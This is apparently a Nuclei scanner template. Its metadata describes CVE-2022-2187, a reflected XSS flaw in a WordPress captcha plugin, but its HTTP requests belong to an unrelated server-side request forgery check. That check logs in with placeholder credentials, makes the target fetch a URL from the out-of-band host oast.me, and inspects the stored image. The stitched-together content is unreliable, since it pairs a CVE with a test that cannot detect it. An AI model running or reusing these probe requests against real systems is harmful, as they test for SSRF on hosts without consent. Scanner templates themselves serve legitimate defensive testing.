  classification:
    cpe: cpe:2.3:a:contact_form_7_captcha_project:contact_form_7_captcha:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-2187
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.91766
    epss-score: 0.07773
  description: 'WordPress Contact Form 7 Captcha plugin before 0.1.2 contains a reflected
    cross-site scripting vulnerability. It does not escape the $_SERVER[''REQUEST_URI'']
    parameter before outputting it back in an attribute.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into the website, potentially leading to session hijacking,
    defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: contact_form_7_captcha
    vendor: contact_form_7_captcha_project
  name: WordPress Contact Form 7 Captcha <0.1.2 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/4fd2f1ef-39c6-4425-8b4d-1a332dabac8d
  - https://wordpress.org/plugins/contact-form-7-simple-recaptcha
  - https://nvd.nist.gov/vuln/detail/CVE-2022-2187
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Update the WordPress Contact Form 7 Captcha plugin to version 0.1.2
    or later to mitigate the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2022,wpscan,wordpress,xss,wp-plugin,wp,contact_form_7_captcha_project,vuln
---
http:
- extractors:
  - group: 1
    internal: true
    name: token
    regex:
    - '"token":"(.*?)"'
    type: regex
  - group: 1
    internal: true
    name: filename
    regex:
    - coverupload.(.*?).png
    type: regex
  matchers:
  - part: body_3
    type: word
    words:
    - Interactsh Server
  - part: header
    type: word
    words:
    - image/png
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /api/account/login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Content-Type: application/json


    {"username":"{{username}}","password":"{{password}}"}

    '
  - 'POST /api/upload/upload-by-url HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Authorization: Bearer {{token}}

    Content-Type: application/json


    {"url":"http://oast.me/#.png"}

    '
  - 'GET /api/image/cover-upload?filename=coverupload_{{filename}}.png HTTP/1.1

    Host: {{Hostname}}

    Authorization: Bearer {{token}}

    '
